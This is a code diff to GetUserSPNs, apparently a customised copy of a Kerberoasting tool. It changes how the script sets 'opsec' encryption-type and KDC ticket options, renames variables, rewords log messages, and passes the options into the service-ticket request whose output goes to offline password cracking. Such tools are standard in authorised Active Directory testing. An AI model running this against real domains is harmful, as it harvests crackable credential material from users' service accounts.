@@ -87,10 +87,6 @@ class GetUserSPNs:
         if cmdLineOptions.hashes is not None:
             self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
 
-        # opsec consideration
-        self.__encryption = encType
-        self.__options = options
-
         # Create the baseDN
         domainParts = self.__targetDomain.split('.')
         self.baseDN = ''
@@ -104,6 +100,10 @@ class GetUserSPNs:
         if user_domain != target_domain and self.__kdcHost:
             logging.warning('DC ip will be ignored because of cross-domain targeting.')
             self.__kdcHost = None
+
+        #opsec options
+        self.__encryption = encType
+        self.__options = options
 
     def getMachineName(self):
         if self.__kdcHost is not None and self.__targetDomain == self.__domain:
@@ -130,7 +130,7 @@ class GetUserSPNs:
         t /= 10000000
         return t
 
-    def getTGT(self, encType=23):
+    def getTGT(self, encType):
         if self.__doKerberos:
             domain, _, TGT, _ = CCache.parseFile(self.__domain)
             if TGT is not None:
@@ -270,32 +270,31 @@ class GetUserSPNs:
                 users = dict( (vals[1], vals[0]) for vals in answers)
 
                 # Check for forced encryption
-                encType = self.__encryption
+                enctype = self.__encryption
 
                 # Get a TGT for the current user
-                TGT = self.getTGT(encType)
+                TGT = self.getTGT(enctype)
 
                 # convert hex to binary
                 kdcopt = self.__options
                 if kdcopt == None:
                     kdcopt = "0x40810010"
 
-                logging.debug(f"Using {kdcopt} as ticket options")
-
                 scale = 16
                 kdcbin = bin(int(kdcopt, scale))[2:].zfill(32)
 
                 # enable options based on binary (left to right)
                 opt = list()
-                opt_used = list()
+                kdc_opts = list()
                 idx = -1
                 for b in kdcbin:
                     idx += 1
                     if int(b) == 1:
-                        opt_used.append(constants.KDCOptions(idx).name)
                         opt.append(constants.KDCOptions(idx).value)
+                        kdc_opts.append(constants.KDCOptions(idx).name)
 
-                logging.debug("KDC options used: " + ','.join(opt_used))
+                logging.debug("Using KDC Options (" + ','.join(kdc_opts) + ")")
+
                 for user, SPN in users.items():
                     sAMAccountName = user
                     downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName
@@ -309,9 +308,9 @@ class GetUserSPNs:
                             tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                                     self.__kdcHost,
                                                                                     TGT['KDC_REP'], TGT['cipher'],
-                                                                                    TGT['sessionKey'], encType=encType)
+                                                                                    TGT['sessionKey'], opt, enctype)
                         except:
-                            logging.error(f"Principal {principalName} does not support AES encryption")
+                            logging.error(f"User {principalName} does not support AES encryption")
                             continue
 
                         sess_key = self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, self.__targetDomain + "/" + sAMAccountName)
